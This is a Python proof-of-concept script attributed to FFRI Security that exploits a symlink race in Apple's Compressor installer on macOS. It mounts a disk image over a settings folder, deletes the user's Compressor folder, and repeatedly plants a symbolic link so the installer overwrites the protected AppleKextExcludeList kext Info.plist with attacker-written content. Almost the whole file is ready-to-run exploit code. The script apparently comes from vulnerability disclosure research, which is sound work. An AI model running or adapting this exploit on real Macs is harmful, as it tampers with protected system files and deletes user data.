#
# (c) FFRI Security, Inc., 2023 / Author: FFRI Security, Inc.
#
import os
import subprocess


def get_login_user() -> str:
    return subprocess.run(["stat", "-f", "%Su", "/dev/console"], stdout=subprocess.PIPE, check=True).stdout.decode("utf-8").strip()


def _main():
    if os.getuid() != 0:
        print("Please run this script as a root user")
        return

    root_source_dir = "/Library/Application Support/Compressor/Settings/MXF"
    if os.path.exists(root_source_dir):
        print(f"Deleting {root_source_dir}")
        os.system(f"rm -rf {root_source_dir}")
        print("Deleting /tmp/temp.dmg")
        os.system(f"rm -f /tmp/temp.dmg")
    print(f"Creating {root_source_dir}")
    os.system(f"mkdir -p '{root_source_dir}'")
    os.system(f"hdiutil create -size 9G -volname temp -fs HFS+ /tmp/temp.dmg")
    os.system(f"hdiutil attach -mountpoint '{root_source_dir}' /tmp/temp.dmg")

    print(f"Creating large file")
    os.system(f"yes aaaaaaaaaaaaaaa | head -n 268435456 > '{root_source_dir}/a'")
    os.system(f"echo 'pwned' > '{root_source_dir}/b'")
    # os.system(f"cp Info.plist '{root_source_dir}/b'")

    user_name = get_login_user()
    user_home = os.path.join("/Users", user_name)
    compressor_mxf = os.path.join(user_home, "Library/Application Support/Compressor")
    os.system(f"rm -rf '{compressor_mxf}'")

    target_file = "/Library/Apple/System/Library/Extensions/AppleKextExcludeList.kext/Contents/Info.plist"
    if not os.path.exists("Info.plist"):
        print("Create backup")
        os.system(f"cp '{target_file}' .")

    print("Please run installer")
    compressor_settings_mxf = os.path.join(user_home, "Library/Application Support/Compressor/MXF")
    symlink_file = os.path.join(compressor_settings_mxf, "b")
    print(f"Creating symbolic link {symlink_file} -> {target_file}")
    while True:
        try:
            if os.path.exists(compressor_settings_mxf):
                os.system(f"ln -s '{target_file}' '{symlink_file}'")
                break
        except:
            pass


if __name__ == "__main__":
    _main()